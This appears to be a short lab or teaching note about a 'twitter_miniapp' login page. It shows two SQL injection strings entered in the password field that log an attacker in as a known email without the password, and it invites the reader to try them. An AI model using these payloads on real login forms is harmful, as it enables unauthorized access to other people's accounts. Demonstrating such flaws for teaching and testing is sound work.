For the twitter_miniapp, suppose an attacker knows a victim's email, but doesn't know the password.

The attacker can enter the following log in inputs:
email: test@test.com
password: ' or 'x' = 'x

or

email: test@test.com
password: ' or 1 = 1 -- (white spaces are important)

Try it out and you can see that you are logged in without the correct password.
